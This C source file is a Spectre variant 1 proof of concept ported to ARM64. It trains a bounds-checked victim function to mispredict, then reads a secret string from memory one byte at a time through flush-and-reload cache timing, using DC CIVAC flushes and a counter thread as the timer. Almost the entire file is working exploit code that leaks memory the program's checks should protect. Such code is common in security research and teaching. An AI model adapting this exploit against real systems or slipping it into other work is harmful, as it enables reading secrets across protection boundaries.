#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <pthread.h>

/********************************************************************
Victim code.
********************************************************************/
volatile uint64_t counter = 0;
uint64_t miss_min = 0;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
char* secret = "i am benshushu";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

void *inc_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY");
	}
}

// timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
static uint64_t timed_read(volatile uint8_t *addr) {
	uint64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return counter - ns;
}

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

uint64_t measure_latency() {
	uint64_t ns;
	uint64_t min = 0xFFFFF;

	for (int r = 0; r < 300; r++) {
		flush(&array1[0]);
		ns = timed_read(&array1[0]);
		if (ns < min) min = ns;
	}

	return min;
}


/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--) {

		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			flush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			flush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			time2 = timed_read(&array2[mix_i * 512]);
			if (time2 <= miss_min && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (j == 0)
			continue;

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char * * argv) {
	printf("Putting '%s' in memory\n", secret);
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	pthread_t inc_counter_thread;
	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
    // let the bullets fly a bit ....
	while (counter < 10000000);
	asm volatile ("DSB SY");

	miss_min = measure_latency();
	if (miss_min == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}
	miss_min -= 1;
	printf("miss_min %d\n", miss_min);

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
			(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
			(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				score[1]);
		printf("\n");
	}
	return (0);
}

